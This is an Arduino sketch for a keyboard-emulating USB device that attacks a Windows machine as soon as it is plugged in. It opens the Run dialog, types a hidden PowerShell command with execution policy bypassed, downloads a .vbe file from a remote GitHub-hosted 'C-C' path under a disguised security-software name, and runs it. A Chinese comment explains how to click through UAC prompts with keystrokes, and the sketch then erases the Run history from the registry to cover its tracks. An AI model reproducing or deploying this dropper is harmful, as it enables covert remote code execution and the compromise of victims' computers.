void setup() {
  Keyboard.begin();
  
  delay(5000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  delay(500);
  
  // you can CHANGE this URL
  Keyboard.println("POWERSHELL -NOP -W HIDDEN -EXECuTIONpOLICY BYPASS -C (nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOAdfILE('https://cdn.jsdelivr.net/gh/tokisaki-galaxy/C-C/C-C.vbe', 'c:\\USERS\\PUBLIC\\360HIPS.vbe');START c:\\USERS\\PUBLIC\\360HIPS.vbe;EXIT");
  // NO WINDOWS,BYPASS
  // 遇到UAC这种，键盘模拟也可以绕过（说是绕过，其实就是操作键盘按键来选择赋权），比如CMD的管理员模式，可以win+r打开后，输入cmd，再按住Shift+Ctrl+回车即可以管理员启动cmd，同时控制好延时时间，对弹出来的UAC，按住Alt即可出现Y/N对“是/否”的选择。或者直接操作左键+回车都可以选择到“是”来打开管理员cmd
  Keyboard.press(KEY_LEFT_GUI);
  delay(500);
  Keyboard.press('r');
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);
  delay(500);
  Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();
}
void loop()
{
	//None
}